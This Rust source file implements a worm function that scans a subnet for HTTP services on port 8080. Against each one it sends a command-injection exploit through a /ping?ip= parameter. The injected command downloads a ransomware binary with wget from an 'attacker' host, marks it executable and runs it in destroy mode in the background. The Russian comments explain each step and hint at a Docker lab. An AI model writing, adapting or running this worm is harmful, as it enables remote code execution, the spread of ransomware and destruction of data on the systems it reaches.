use anyhow::Result;
use log::{error, info};
use std::net::TcpStream;
use std::time::Duration;
use ipnetwork::Ipv4Network;
use reqwest::blocking::Client;

pub fn scan_and_infect(subnet_cidr: &str) -> Result<()> {
    info!("🚀 WORM: Scanning for vulnerable HTTP services on {}", subnet_cidr);
    let net: Ipv4Network = subnet_cidr.parse()?;
    let client = Client::builder().timeout(Duration::from_secs(2)).build()?;

    // Мы предполагаем, что attacker раздает файл d-ransom на порту 8000
    // Адрес атакующего нужно знать или угадать. В Docker сети это обычно hostname "attacker"
    let payload_url = "http://attacker:8000/d-ransom";
    
    // Команда, которую выполнит жертва (RCE)
    // 1. Скачать вирус -> 2. Дать права -> 3. Запустить destroy в фоне
    let rce_command = format!("wget {} -O /tmp/dr && chmod +x /tmp/dr && nohup /tmp/dr destroy > /dev/null 2>&1 &", payload_url);
    
    // URL-кодируем команду (простая замена пробелов)
    let injection = format!("127.0.0.1; {}", rce_command);

    for ip in net.iter() {
        let ip_str = ip.to_string();
        if ip_str.ends_with(".1") { continue; }

        let target = format!("{}:8080", ip_str);
        
        // Быстрый чек порта
        if TcpStream::connect_timeout(&target.parse().unwrap(), Duration::from_millis(100)).is_ok() {
            info!("🔓 Found HTTP service at {}. Sending Exploit...", target);
            
            // Отправляем GET запрос с инъекцией
            let exploit_url = format!("http://{}/ping?ip={}", target, url_encode(&injection));
            
            match client.get(&exploit_url).send() {
                Ok(resp) => {
                    if resp.status().is_success() {
                        info!("💀 EXPLOIT SENT to {}. If vulnerable, infection has started.", ip_str);
                    }
                },
                Err(e) => error!("Failed to send exploit: {}", e)
            }
        }
    }
    Ok(())
}

fn url_encode(s: &str) -> String {
    s.replace(" ", "%20").replace(";", "%3B").replace("/", "%2F").replace("&", "%26")
}